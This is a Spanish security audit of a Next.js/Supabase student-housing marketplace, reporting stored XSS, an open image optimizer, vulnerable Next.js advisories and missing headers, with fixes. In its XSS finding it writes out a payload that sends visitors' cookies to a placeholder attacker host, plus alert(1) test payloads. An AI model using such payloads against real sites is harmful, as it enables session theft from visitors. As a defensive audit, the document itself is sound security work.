# Auditoría de seguridad y preparación para producción — Tarea #4

**Auditor:** Seguridad & DevOps (última línea de revisión antes de producción)
**Proyecto:** `pensiones-unimagdalena/` — marketplace de pensiones y habitaciones para estudiantes de la Universidad del Magdalena (Santa Marta)
**Fecha:** 17 de septiembre de 2026
**Alcance:** `middleware.ts`, `utils/supabase/*`, `lib/supabase/*`, `supabase/esquema.sql`, `app/actions/pensiones.ts`, formularios de autenticación y publicación, `app/auth/signout/route.ts`, `next.config.mjs`, `.env.example` / `.env.local`, `public/sw.js`, `package.json`, lanzadores `.bat`.
**Modo de operación:** SOLO lectura. No se modificó ningún archivo del proyecto, no se ejecutó `npm run build`, `npm start` ni `npm run dev` (carpeta `.next` compartida con el resto del equipo), no se ejecutó DDL contra ninguna base de datos.

---

## 1. Resumen ejecutivo

**Veredicto: NO APTO para producción en su estado actual.** No por la calidad del código —que es alta y está bien estructurada— sino por **tres condiciones objetivas** que en un despliegue público se convierten en incidentes:

1. **Existe un XSS almacenado explotable** por cualquier anfitrión registrado, sin CSP que lo contenga. La cadena completa está verificada en el código: entrada sin sanear → `JSON.stringify` sin escapar `<` → `dangerouslySetInnerHTML` en el HTML de todas las páginas.
2. **La configuración de imágenes convierte el optimizador de Next en un proxy público** (`remotePatterns: "**"`) y, combinada con AVIF habilitado y `next@14.2.35`, toca dos avisos de seguridad oficiales: uno **crítico** (RCE no autenticado en la Image Optimization API cuando se usan AVIF, corregido en 15.5.24) y uno moderado que describe **exactamente** esta configuración (DoS por `remotePatterns`).
3. **No hay control de abuso ni moderación**: cualquiera puede registrarse y publicar directamente en el catálogo público. Con el XSS del punto 1, el catálogo es un vector de distribución.

Además, el proyecto **no tiene repositorio git ni CI/CD** (no hay historial, ni revisión, ni rollback) y **no hay observabilidad**: la "degradación segura al catálogo demo" hace que una caída de Supabase en producción se vea como un día normal, sin una sola alerta.

### Corrección importante sobre el conteo de vulnerabilidades

El enunciado de la tarea (y el informe previo del equipo) reporta **"2 vulnerabilidades"**. Eso es el número de **paquetes**, no de avisos. Verificado con `npm audit --json` hoy:

```
2 paquetes afectados (next directo, postcss transitivo)
23 avisos de seguridad distintos sobre next@14.2.35
 4 avisos de seguridad distintos sobre el postcss embebido en next (8.4.31)
```

De esos 23 avisos sobre `next`, **19 aplican a la versión instalada** y **5 son de severidad crítica/alta con exposición directa en este proyecto concreto** (detalle completo y análisis de exposición real en la §5).

### Tabla de prioridades

| ID | Hallazgo | Severidad | Esfuerzo | Bloquea lanzamiento |
|---|---|---|---|---|
| S-01 | XSS almacenado vía JSON-LD sin escapar (sin CSP) | 🔴 Crítico | 1–2 h | **Sí** |
| S-02 | AVIF + `remotePatterns: "**"` + next 14.2.35 → RCE/DoS del optimizador | 🔴 Crítico | 15 min (mitigación) / 1–3 d (upgrade) | **Sí** |
| S-03 | DoS en Server Actions / Server Components (App Router) | 🟠 Alto | incluido en upgrade | **Sí** |
| S-04 | Cero cabeceras de seguridad (CSP, HSTS, frame-ancestors, nosniff) | 🟠 Alto | 2–4 h | **Sí** |
| S-05 | Número de WhatsApp con fallback silencioso en producción | 🟠 Alto | 30 min | **Sí** |
| S-06 | Sin rate limiting ni moderación; publicación pública inmediata | 🟠 Alto | 1–2 d | **Sí** |
| S-07 | Sin git, sin CI/CD, sin artefacto de build reproducible | 🟠 Alto | 4–8 h | Recomendado |
| S-08 | Service Worker cachea HTML autenticado y respuestas no-OK | 🟡 Medio | 1–2 h | No |
| S-09 | Redirección abierta en `?destino=` | 🟡 Medio | 30 min | No |
| S-10 | Esquema SQL sin límites de forma (validación solo en el Server Action) | 🟡 Medio | 2 h | No |
| S-11 | `rol` auto-asignable desde metadatos de registro | 🟡 Medio | 30 min | No |
| S-12 | Dominio canónico y enlaces compartidos hardcodeados | 🟡 Medio | 1 h | Recomendado |
| S-13 | Sin observabilidad ni alertas (fallos enmascarados por el modo demo) | 🟡 Medio | 3–4 h | Recomendado |
| S-14 | Sin aviso de privacidad ni ruta de borrado de datos personales | 🟡 Medio | 1–2 d | Según asesoría legal |
| S-15 | `POST /auth/signout` sin validación de origen (logout CSRF) | 🟢 Bajo | 30 min | No |
| S-16 | `taskkill /F` indiscriminado sobre el puerto 3000 en los `.bat` | 🟢 Bajo | 15 min | No |
| S-17 | Sin `engines`/`.nvmrc`; dependencias con rango `^` | 🟢 Bajo | 20 min | No |

**Ruta mínima para poder lanzar:** S-01, S-02 (mitigación de 15 minutos), S-04, S-05, S-06 → **menos de un día de trabajo**. El resto son oleadas 2 y 3.

---

## 2. Método y límites de la verificación

**Qué se hizo:**
- Lectura íntegra (no grep superficial) de los 20 archivos clave listados en el alcance, más `app/layout.tsx`, `app/page.tsx`, `app/pensiones/[id]/page.tsx`, `app/login/page.tsx`, `app/registro/page.tsx`, `app/publicar/page.tsx`, `components/Formulario*.tsx`, `components/InstalarApp.tsx`, `components/Carrusel.tsx`, `lib/datos.ts`, `lib/formato.ts`, `lib/pension.ts`, `lib/sitio.ts`, `lib/auth-mensajes.ts`, `hooks/useFavoritos.ts`, `app/manifest.ts`, `README.md`, `docs/integracion-supabase.md`, `docs/respuesta-auditoria-externa.md`, `docs/auditorias/{datos-backend,tecnica-rendimiento,ux-cro}.md` (para no duplicar hallazgos ya entregados por el equipo).
- Búsqueda dirigida de patrones peligrosos en **todos** los archivos del proyecto (excluyendo `node_modules`, `.next`, `package-lock.json`): `dangerouslySetInnerHTML`, `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`, `service_role`, `SUPABASE_SERVICE`, `rate limit`, `captcha`, `headers()`.
- `npm audit --json` (solo lectura, sin red de escritura) + verificación de versiones instaladas en `node_modules/next/package.json` y `node_modules/next/node_modules/postcss/package.json`.
- Consulta de las fichas oficiales de los avisos (GitHub Advisory Database / OSV) para no citar de memoria.
- Comprobaciones ejecutables de las afirmaciones críticas (evidencia reproducible en §"Anexo A").
- Inspección del estado del build existente en `.next/` (solo lectura).

**Qué NO se hizo y por qué:**
- No se compiló ni se arrancó el servidor: `.next` es compartido y compilaciones simultáneas ya corrompieron la caché una vez en este proyecto. En consecuencia, **las comprobaciones de comportamiento en vivo (respuestas HTTP reales) no forman parte de esta evidencia**; todo hallazgo se apoya en código fuente, configuración o respuesta de herramientas oficiales.
- No se probó el modo dinámico contra Supabase: **no hay credenciales** en `.env.local` (solo `NEXT_PUBLIC_WHATSAPP_NUMBER`, con las líneas de Supabase comentadas). Todo lo relativo a RLS es **análisis estático del DDL**, no verificación en vivo contra un proyecto real.
- No se ejecutó DDL ni migración alguna.
- Estado de `.next` en el momento de la auditoría: existe la carpeta, pero **no hay `BUILD_ID` ni HTML prerenderizado** (`prerender-manifest.json` ausente) → no hay artefacto de build válido en disco.

**Criterio de severidad aplicado:** crítico = ejecución de código o robo de datos/credenciales sin autenticación; alto = caída del servicio, abuso masivo o pérdida de control del contenido público; medio = impacto acotado, requiere condiciones adicionales o afecta a datos personales; bajo = higiene, defensa en profundidad o riesgo operativo menor.

---

## 3. Hallazgos

### 🔴 S-01 — XSS almacenado vía JSON-LD (datos del anfitrión sin escapar) · Crítico

**Evidencia**
- `app/pensiones/[id]/page.tsx:266-269` — el JSON-LD se inyecta con `dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLdPension) }}`.
- El objeto incluye datos **controlados por el anfitrión**: `name: pension.titulo` (`:76`), `description: pension.descripcion` (`:77-79`), `streetAddress` (`:85-87`), `amenityFeature[].name` (`:112-115`).
- Mismo patrón en `app/page.tsx:45-48` con `name: pension.titulo` (`:38`), y en `app/layout.tsx:154-157`.
- La entrada **no se sanea en ningún punto**: `app/actions/pensiones.ts:55-57` solo hace `trim()`; la validación de `:80-99` comprueba longitudes mínimas y precio, **nunca caracteres**.
- El saneado tampoco ocurre al leer: `lib/supabase/mapeo.ts:56-79` mapea fila → dominio sin transformar el texto.

**Por qué es explotable y no teórico**
`JSON.stringify` escapa comillas y barras invertidas, pero **no escapa `<`, `>`, `&` ni `/`**. Verificado localmente:

```
$ node -e "console.log(JSON.stringify({titulo:'</script><script>alert(1)</script>'}))"
{"titulo":"</script><script>alert(1)</script>"}
```

El navegador cierra el `<script type="application/ld+json">` en el `</script>` inyectado y ejecuta el código siguiente **en el dominio de la marca, para todos los visitantes** (no solo para el anfitrión malicioso).

**Superficie de explotación (dos vías)**
1. **Vía formulario**: un anfitrión registrado publica con título `</script><script>fetch('https://malo/?c='+document.cookie)</script>`. La ficha se genera con `generateStaticParams` + ISR (60 s) y el payload queda **servido desde caché a todos los visitantes**.
2. **Vía PostgREST (evita el Server Action y su validación)**: la clave anónima es pública y la política `pensiones: crear las propias` (`supabase/esquema.sql:122-124`) autoriza `insert` con cualquier contenido mientras `auth.uid() = anfitrion_id`. La validación del Server Action **no es una frontera de seguridad**: cualquiera con una cuenta puede hacer `POST /rest/v1/pensiones` con el token de su sesión y saltársela.

**Sin contención**: se verificó que **no existe ninguna cabecera `Content-Security-Policy`** en el proyecto (§S-04), así que no hay segunda línea de defensa.

**Riesgo concreto**: robo de sesión de visitantes y anfitriones, suplantación del sitio (phishing sobre el dominio de la marca), inyección de contenido, y —al tratarse de un marketplace que pide confianza a padres y estudiantes— destrucción de la propuesta de valor (el sello "verificado" del proyecto).

**Propuesta de implementación**
1. **Escapar antes de inyectar** (arreglo mínimo, 15 minutos): no usar `JSON.stringify` directo. Serializar con reemplazo de caracteres peligrosos en **los tres** puntos (`app/layout.tsx:154`, `app/page.tsx:45`, `app/pensiones/[id]/page.tsx:266`). Ejemplo de helper en `lib/json-ld.ts`:

   ```ts
   export function jsonLdSeguro(datos: unknown): string {
     return JSON.stringify(datos)
       .replace(/</g, "\\u003c")
       .replace(/>/g, "\\u003e")
       .replace(/&/g, "\\u0026")
       .replace(/\u2028|\u2029/g, "");
   }
   ```
   Esto es exactamente lo que hace el propio Next.js en sus scripts inline y es compatible con Google (el JSON-LD sigue siendo válido y parseable).

2. **Sanear en la escritura** (defensa en profundidad): rechazar/limpiar `<` `>` en `titulo`, `descripcion`, `direccion`, `barrio` y en los elementos de `servicios`, `normas` e `imagenes` dentro de `crearPension` (`app/actions/pensiones.ts`), y **además** en el esquema SQL (§S-10), porque el Server Action no cubre la vía PostgREST.
3. **Añadir CSP** (§S-04) para que un fallo futuro no vuelva a ser ejecutable.
4. **Prueba de regresión**: publicar una ficha de prueba con `</script><script>alert(1)</script>` en el título y verificar que se renderiza como texto. Añadirlo al `scripts/prueba-humo.mjs` o a un nuevo `scripts/verificar-seguridad.mjs`.

**Esfuerzo:** 1–2 h (arreglo) + 1 h (prueba). **Coste:** 0 €.

---

### 🔴 S-02 — Optimizador de imágenes abierto a Internet + AVIF habilitado · Crítico

**Evidencia**
- `next.config.mjs:10-14`:
  ```js
  remotePatterns: [
    { protocol: "https", hostname: "images.unsplash.com" },
    { protocol: "https", hostname: "**.supabase.co" },
    { protocol: "https", hostname: "**" },   // ← comodín total
  ],
  ```
  El tercer patrón **subsume a los dos anteriores**: cualquier `hostname` ya está permitido, así que las dos primeras líneas no aportan ninguna restricción.
- `next.config.mjs:6` — `formats: ["image/avif", "image/webp"]` (AVIF activo, no solo WebP).
- `package.json:16,20` — `next@^14.2.35` (instalado: **14.2.35**) y `sharp@^0.35.4` (instalado: **0.35.4**, es el motor que Next usa para AVIF).
- `components/Carrusel.tsx:79-87` y `app/pensiones/[id]/page.tsx:122-129` envían a `next/image` las URLs de `pension.imagenes`, que provienen del campo de texto libre del formulario (`components/FormularioPension.tsx:186-200`).
- No hay ninguna cabecera ni configuración que limite el endpoint `/_next/image`.

**Riesgo 1 — RCE no autenticado por AVIF (el más grave)**
`npm audit` reporta sobre `next@14.2.35`:

| Aviso | Título | Severidad | Rango afectado |
|---|---|---|---|
| GHSA-2xp9-vwfh-vxw4 | Next.js: Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used | **Crítica (CVSS 4.0: AV:N/AC:L, impacto alto en C/I/A)** | `>=10.0.0 <15.5.24` |

Detalle oficial: la causa raíz es una vulnerabilidad de `libheif`, la librería que usa `sharp` para AVIF, y que Next.js emplea en la optimización de imágenes. La propia ficha indica que, hasta que la corrección se propague, **la optimización de AVIF queda deshabilitada**. Este proyecto hace justo lo contrario: **la habilita explícitamente** y publica la superficie exacta (endpoint `/_next/image` público, sin autenticación, con orígenes remotos sin restringir).

**Riesgo 2 — El optimizador como proxy público de descarga**
Con `hostname: "**"`, cualquier persona puede pedir `/_next/image?url=https://su-dominio/archivo-grande&w=3840&q=100`. El servidor de la aplicación **descarga y procesa** ese recurso. Esto habilita: amplificación de ancho de banda y coste (cada petición consume CPU de `sharp` y salida de red del proyecto), relleno de la caché de disco de imágenes, y uso del dominio del marketplace como proxy de descarga para contenidos ajenos.

**Riesgo 3 — DoS por `remotePatterns` (CVE confirmado sobre esta configuración exacta)**

| Aviso | Título | Severidad | Rango |
|---|---|---|---|
| GHSA-9g9p-9gw9-jx7f (CVE-2025-59471) | Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration | Moderada (CVSS 5.9, CWE-400/770) | `>=10.0.0 <15.5.10` |
| GHSA-3x4c-7xq6-9pq8 | Unbounded next/image disk cache growth can exhaust storage | Moderada (CWE-400) | `>=10.0.0 <15.5.14` |
| GHSA-h64f-5h5j-jqjh | Denial of Service in the Image Optimization API | Moderada (CWE-770) | `>=10.0.0 <15.5.16` |

Es decir: **tres avisos oficiales describen exactamente este patrón de configuración** y la versión instalada está dentro de todos los rangos.

**Nota honesta sobre la exposición en producción**: si el despliegue se hace en Vercel, el proceso que ejecuta la optimización corre en infraestructura gestionada, lo que reduce el impacto de la ejecución de código arbitrario (no es tu VM). Aun así (a) el endpoint sigue siendo alcanzable sin autenticación, (b) los riesgos 2 y 3 son de coste y disponibilidad **en tu cuenta**, y (c) en desarrollo/producción local sobre Windows la exposición es total — ver S-02b.

**Propuesta de implementación**
1. **Mitigación inmediata (15 minutos, sin cambiar de versión)**: quitar `"image/avif"` de `formats` en `next.config.mjs:6`. WebP ya aporta ~30 % de reducción frente a JPEG y elimina el vector de `libheif`.
2. **Cerrar el comodín (5 minutos)**: eliminar `{ protocol: "https", hostname: "**" }`. Para permitir fotos pegadas por anfitriones desde cualquier hosting, la alternativa segura es una **ruta de subida propia** (Supabase Storage con dominio fijo) y listar solo esos orígenes. Si se decide mantener la flexibilidad, debe ir acompañado de límites (ver punto 4).
3. **Subir `next` a `>=15.5.24`** (o 16.3.x) — ver §5 y el plan de migración de la tarea #7 (`docs/auditorias/tecnica-rendimiento.md`), que ya cubre el salto de versión. Cualquier corrección de AVIF pasa por ahí.
4. **Defensa en profundidad si se mantienen orígenes flexibles**: validar en el esquema SQL que `imagenes` solo contenga HTTPS de dominios de confianza (§S-10), y desactivar el optimizador para esas rutas (`unoptimized`) si no se controla el origen.
5. **Verificación**: `npm audit --omit=dev` no debe mostrar avisos sobre `next`; y una petición manual a `/_next/image?url=https://sitio-externo-x/foto.jpg` debe fallar con 400 si se restringió `remotePatterns`.

**Esfuerzo:** 15–20 min la mitigación; 1–3 días el upgrade mayor. **Coste:** 0 € (mitigación); el upgrade consume tiempo de desarrollo, no licencias.

---

### 🔴 S-02b — RCE no autenticado en servidores Next alojados en Windows · Crítico (entorno local)

**Evidencia / contexto**: `Iniciar-App.bat:53` y `Iniciar-Dev.bat:39` levantan el servidor en la máquina **Windows** del equipo, y en el proyecto ya se documentó el acceso desde el teléfono por IP de la red local (`README.md:91`), lo que implica que el servidor escucha en interfaces de red y no solo en `127.0.0.1`.

| Aviso | Título | Severidad | Rango |
|---|---|---|---|
| GHSA-p293-qw3h-jr36 (CVE-2026-75604) | Next.js: Unauthenticated Remote Code Execution on windows-hosted servers (CWE-22, path traversal) | **Crítica** | `>=13.4.0 <15.5.24` |

**Riesgo concreto**: mientras se prueba la app en la máquina de desarrollo, cualquier dispositivo de la misma red (Wi-Fi compartida de residencia, coworking, universidad) puede alcanzar el servidor. Es el escenario clásico de "desarrollo en red abierta".

**Propuesta**
- En los lanzadores, forzar `127.0.0.1`: `npm run dev -- -H 127.0.0.1` y `npm start -- -H 127.0.0.1` (y documentar el túnel HTTPS —`npx localtunnel`— para probar en el teléfono, que además es el único camino válido para el Service Worker por exigir HTTPS).
- Subir `next` a `>=15.5.24` en cuanto se aborde la migración.
- No exponer nunca el servidor local en `0.0.0.0` con datos reales de Supabase.

**Esfuerzo:** 15 min. **Coste:** 0 €.

---

### 🟠 S-03 — DoS en Server Actions y Server Components (App Router) · Alto

**Evidencia**
- El proyecto usa **al menos una Server Action**: `app/actions/pensiones.ts:1` (`"use server"`) y `:32` (`crearPension`), consumida en `components/FormularioPension.tsx:4,44,47`.
- Avisos aplicables a `next@14.2.35`:

| Aviso | Título | Severidad | Rango |
|---|---|---|---|
| GHSA-m99w-x7hq-7vfj (CVE-2026-64641) | Denial of Service in App Router using Server Actions | Alta (CWE-834) | `>=13.0.0 <15.5.21` |
| GHSA-q4gf-8mx6-v5v3 (CVE-2026-23869) | Denial of Service with Server Components | Alta (CVSS 7.5, CWE-770) | `>=13.0.0 <15.5.15` |
| GHSA-8h8q-6873-q5fj | Denial of Service with Server Components | Alta (CVSS 7.5, CWE-770) | `>=13.0.0 <15.5.16` |
| GHSA-h25m-26qc-wcjf | HTTP request deserialization DoS with insecure React Server Components | Alta (CVSS 7.5, CWE-400/502) | `>=13.0.0 <15.0.8` |
| GHSA-955p-x3mx-jcvp | Unauthenticated disclosure of internal Server Function endpoints | Moderada (CWE-201) | `>=13.0.0 <15.5.21` |
| GHSA-4c39-4ccg-62r3 | Unbounded Server Action payload in Edge runtime | Moderada (CWE-770) | `>=13.0.0 <15.5.21` |

La ficha de `GHSA-m99w-x7hq-7vfj` es explícita: *"Crafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process"*, y añade que **no existe mitigación salvo actualizar**.

**Riesgo concreto**: saturación del proceso que atiende la web con un puñado de peticiones malformadas — en Vercel se traduce en consumo de invocaciones y posible degradación general del sitio para los estudiantes.

**Propuesta**
- Priorizar la migración de `next` a `>=15.5.24` (o 16.3.x): es la única corrección real. Ya está planificada en `docs/auditorias/tecnica-rendimiento.md` — esta auditoría **aporta la justificación de seguridad para elevarla de "deuda técnica" a "bloqueante antes de lanzar"**.
- Mitigación temporal en el borde: reglas de rate limiting / WAF sobre `POST` (Vercel Firewall o equivalente) y limitar el tamaño de payload aceptado.
- No exponer Server Actions que no sean necesarias y mantener el número de acciones al mínimo (hoy solo hay una: correcto).

**Esfuerzo:** el del upgrade (1–3 d). **Coste:** 0 € (o el add-on de firewall que ya se contrate).

---

### 🟠 S-04 — Ausencia total de cabeceras de seguridad · Alto

**Evidencia**
- `next.config.mjs` **completo** (23 líneas, leído íntegro) **no define `headers()`**. Búsqueda de `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy` en todo el repositorio: **cero coincidencias**.
- No existe `vercel.json` ni `netlify.toml` (verificado en la raíz del proyecto).
- No se desactiva la cabecera de identificación de tecnología: no hay `poweredByHeader: false`, por lo que las respuestas anuncian `X-Powered-By: Next.js`.

**Riesgo concreto**
- **Sin CSP**: el XSS de S-01 se ejecuta sin ninguna contención (no hay `script-src` que lo bloquee, ni `object-src`, ni `base-uri`).
- **Sin `frame-ancestors`/`X-Frame-Options`**: el formulario de acceso de anfitriones (`/login`) y los CTA de reserva son *clickjackeables* — se puede incrustar el sitio en un iframe transparente y capturar el clic o las credenciales.
- **Sin `X-Content-Type-Options: nosniff` ni `Referrer-Policy`**: sniffing de tipos MIME y fuga de referrer (URLs de fichas de pensión) hacia sitios de terceros (WhatsApp, Unsplash, OpenStreetMap).
- **Sin `Permissions-Policy`**: geolocalización, cámara y micrófono quedan disponibles por defecto para cualquier script de terceros.
- **Sin HSTS**: la primera visita puede hacerse por HTTP y ser interceptada (downgrade/SSL-strip en redes públicas; el público objetivo son estudiantes en redes abiertas).

**⚠️ Advertencia crítica que debe acompañar a esta corrección**: **no implementes CSP con nonces sobre `next@14.2.35`.** El aviso **GHSA-ffhc-5mcf-pf4q** (Next.js vulnerable to XSS in App Router applications using CSP nonces, CWE-79, rango `>=13.4.0 <15.5.16`) convierte esa combinación en una vulnerabilidad nueva. Orden correcto: (1) aplicar CSP basada en **hashes** o `'unsafe-inline'` acotado ahora, (2) migrar a `>=15.5.16` (idealmente `>=15.5.24` por S-02/S-02b), (3) entonces sí, nonces.

**Propuesta de implementación** (bloque para `next.config.mjs`):

```js
const cabecerasSeguridad = [
  { key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",           // temporal: sin nonces en 14.2.x
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob: https://images.unsplash.com https://*.supabase.co https://*.tile.openstreetmap.org",
      "font-src 'self'",
      "connect-src 'self' https://*.supabase.co",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "object-src 'none'",
      "upgrade-insecure-requests",
    ].join("; ") },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
];
```
Ajustes que este proyecto exige y conviene probar tras activar: `wa.me` (navegación, no requiere `connect-src`), los mosaicos de OpenStreetMap (van en `img-src`, ya contemplado) y `fonts.gstatic` (no necesario: las fuentes son autoalojadas con `next/font`, ver §6). Añadir además `poweredByHeader: false` (dos palabras).

**Esfuerzo:** 2–4 h (incluye verificar que nada del sitio se rompe, especialmente mapa, fuentes e imágenes). **Coste:** 0 €.

---

### 🟠 S-05 — Número de WhatsApp con valor por defecto silencioso en producción · Alto

**Evidencia**
- `lib/formato.ts:11` — `const NUMERO_CRUDO = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER ?? "573001234567";`
- `lib/formato.ts:24-30` — el aviso por consola está **condicionado a desarrollo**: `if (process.env.NODE_ENV !== "production" && !numeroWhatsAppValido())`.
- `.env.example:3` fija el mismo número ficticio como ejemplo, y `.env.local` real contiene un número de 12 dígitos (verificado, no se imprime).

**Riesgo concreto**
Si la variable no llega al entorno de producción (error al configurarla en Vercel, cambio de proyecto, *preview* de otro equipo, o el clásico "funcionaba en local"), **el sitio queda operativo y silencioso** mientras **todos los botones "Reservar por WhatsApp" de las 6 fichas envían al estudiante a un número ajeno** (`+57 300 123 4567`). Es el peor fallo posible en este producto: no rompe nada visible, pero **destruye el único canal de conversión** y puede dirigir consultas de menores de edad a un tercero desconocido. Ni el log de desarrollo avisa (en producción el `if` no se ejecuta) ni hay verificación en el pipeline.

**Propuesta**
1. **Sin fallback en producción**: si la variable falta, es un error de configuración, no un caso a tolerar.

   ```ts
   const NUMERO_CRUDO = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER ?? "";
   if (!numeroWhatsAppValido()) {
     if (process.env.NODE_ENV === "production") {
       throw new Error("[WhatsApp] NEXT_PUBLIC_WHATSAPP_NUMBER ausente o inválido: revisa las variables de entorno.");
     }
     console.warn(/* … mensaje actual … */);
   }
   ```
   Debatible entre "fallar el build" y "fallar en runtime"; dado que la variable es `NEXT_PUBLIC_*` y se incrusta en el bundle, **lo correcto es fallar el build** para que Vercel no despliegue una versión rota.
2. **Guardia de pre-despliegue**: script `scripts/verificar-entorno.mjs` que valide `NEXT_PUBLIC_WHATSAPP_NUMBER`, `NEXT_PUBLIC_SUPABASE_URL` y `NEXT_PUBLIC_SUPABASE_ANON_KEY`, ejecutado en el comando de build (`"build": "node scripts/verificar-entorno.mjs && next build"`). Encaja con el `scripts/prueba-humo.mjs` que ya existe.
3. Marcar la variable como **obligatoria y documentada** en el README de despliegue y en la checklist de Vercel (§4.1).

**Esfuerzo:** 30 min. **Coste:** 0 €.

---

### 🟠 S-06 — Sin control de abuso ni moderación: publicación inmediata y pública · Alto

**Evidencia**
- `app/actions/pensiones.ts:115` — toda pensión se inserta con `activa: true` (visible de inmediato en el catálogo, sin revisión).
- `supabase/esquema.sql:45` — la columna `activa` tiene `default true`.
- `supabase/esquema.sql:122-124` — política `insert` para cualquier usuario autenticado con `auth.uid() = anfitrion_id`.
- No existe ninguna limitación de número de publicaciones por anfitrión, ni verificación de identidad, ni cola de revisión, ni captcha en el registro.
- Búsqueda de `rate limit` / `ratelimit` en todo el proyecto: la única coincidencia es el traductor de mensajes de error de Supabase Auth (`lib/auth-mensajes.ts:23`). **No hay rate limiting propio.**

**Riesgo concreto**
Un atacante (o, sin malicia, un usuario torpe) puede: registrar cuentas con correos desechables y **llenar el catálogo público** con cientos de fichas basura o fraudulentas; publicar contenido que contamine los resultados de Google (el sitio se sirve con `index: true`, `layout.tsx:101-110`); y escalar hacia S-01 usando el catálogo como plataforma de distribución. En un marketplace cuyo diferencial declarado es "verificada por el equipo" (`[id]/page.tsx:164-167`), una sola ficha fraudulenta visible destruye la confianza de los padres — el segmento al que apunta el H1.

**Propuesta**
1. **Moderación por defecto**: cambiar a `activa: false` en la inserción (`app/actions/pensiones.ts:115`) y en el `default` del esquema (`esquema.sql:45`), con mensaje al anfitrión del tipo *"Tu publicación quedó en revisión; la revisamos en menos de 24 h"*. Alinea el producto con la promesa de "verificado".
2. **Verificación de correo obligatoria** en el panel de Supabase (Auth → *Confirm email*), y registrar el estado `email_confirmed_at` como requisito para publicar (comprobable en el Server Action: `user.email_confirmed_at`).
3. **Límite por anfitrión**: máximo N fichas activas (p. ej. 3) — aplicable en el Server Action y, sobre todo, como **política/trigger en la base de datos** para que la vía PostgREST no lo evada.
4. **Rate limiting**: en Vercel, reglas de firewall/rate limit sobre las rutas de autenticación y sobre `POST` de Server Actions; si se necesita granularidad, un contador en Supabase antes de insertar. Supabase Auth ya aplica límites a login/registro, pero **no cubre** `crearPension`.
5. **Datos de contacto y contenido**: validar que `imagenes` apunte a orígenes permitidos (§S-10) y que los enlaces no dirijan a dominios ajenos.

**Esfuerzo:** 1–2 días (incluye el flujo de revisión y su validación en base de datos). **Coste:** 0 €; el add-on de firewall de Vercel, si se contrata, va aparte.

---

### 🟠 S-07 — Sin control de versiones, sin CI/CD y sin artefacto de build reproducible · Alto

**Evidencia**
- No existe `.git` en el proyecto (**verificado**): no hay historial, ni ramas, ni revisión de cambios, ni posibilidad de revertir a un estado conocido.
- La "copia de seguridad" actual es manual y vive **dentro** del espacio de trabajo: `backups/pensiones-unimagdalena_2026-09-13_2152/` (607 archivos) y su `.zip` (**verificado**). Esas copias incluyen `.env.local` (con el número real de WhatsApp) — inocuo hoy, peligroso con credenciales de Supabase cuando se activen.
- No hay `.github/workflows`, ni `vercel.json`, ni pipeline alguno (verificado): los únicos controles automatizados son los scripts locales (`scripts/verificar-seo.mjs`, `verificar-contraste.mjs`, `prueba-humo.mjs`), que nadie ejecuta de forma obligatoria.
- Estado de `.next` en el momento de la auditoría: **sin `BUILD_ID` ni HTML prerenderizado** → no hay artefacto de build válido en disco, y no existe forma de reproducirlo automáticamente.
- `package.json` no declara `engines`, y no hay `.nvmrc`: la máquina de desarrollo (Node v22) y el entorno de despliegue pueden diferir, y `sharp` es sensible a la versión de Node.

**Riesgo concreto**
Sin git no hay "deshacer": un cambio erróneo en producción (o el propio bug de caché `.next` que ya ocurrió una vez en este proyecto) no tiene vuelta atrás estructurada. Sin CI, las validaciones que el equipo ya escribió (build, tipos, SEO, contraste, RLS) dependen de la memoria de una persona. Y sin `engines`/`npm ci`, "funciona en mi máquina" sigue siendo el criterio de aceptación — justo lo que este rol debe rechazar.

**Propuesta**
1. **Inicializar git** con `.gitignore` (ya correcto: `/.next/`, `.env*.local` en `.gitignore:7,23`), primer commit del estado actual y un tag `v1.0.0-auditado`. Tras ello, verificar que **ningún fichero `.env.local` ni `node_modules`** quede rastreado (`git status --ignored`).
2. **Repositorio remoto privado** (GitHub) + despliegue de Vercel conectado a la rama `main` (elimina el "subir archivos a mano").
3. **CI mínima** en cada push, en este orden: `npm ci` (respeta `package-lock.json`, nunca `npm install`) → `next lint` → `tsc --noEmit` → `npm run build` → `npm audit --omit=dev --audit-level=high` → `node scripts/verificar-seo.mjs` → `node scripts/verificar-contraste.mjs` → `node scripts/prueba-humo.mjs` contra el build. La propuesta de CI de la tarea #7 (`docs/auditorias/tecnica-rendimiento.md`, §5) es compatible: aquí añado los pasos de **seguridad** (audit con umbral y escaneo de secretos).
4. **Escaneo de secretos**: *secret scanning* + *push protection* de GitHub (gratuito) y **Dependabot** (gratuito) para avisos de dependencias; `npm audit` en CI con umbral `high` para que S-02/S-03 no puedan reaparecer silenciosamente.
5. **`engines` + `.nvmrc`** fijando la misma versión mayor que Vercel.
6. **Respaldos fuera del árbol de trabajo**: mover `backups/` fuera del proyecto (o cifrarlo), y excluir `.env.local` de las copias.

**Esfuerzo:** 4–8 h (el primer pipeline completo). **Coste:** 0 € (GitHub Actions y Dependabot tienen nivel gratuito suficiente para este proyecto).

---

### 🟡 S-08 — El Service Worker cachea HTML autenticado y respuestas de error · Medio

**Evidencia**
- `public/sw.js:62-77` — el manejador de navegaciones cachea **toda** respuesta HTML, sin filtrar por ruta y **sin comprobar `respuesta.ok`** antes de `cache.put(solicitud, copia)`.
- `public/sw.js:17-26` — el precache es correcto (solo públicos), pero el problema está en la captura dinámica de navegaciones.
- No existe ningún borrado de cachés al cerrar sesión: `app/auth/signout/route.ts:6-11` solo ejecuta `signOut()` y redirige.

**Riesgo concreto**
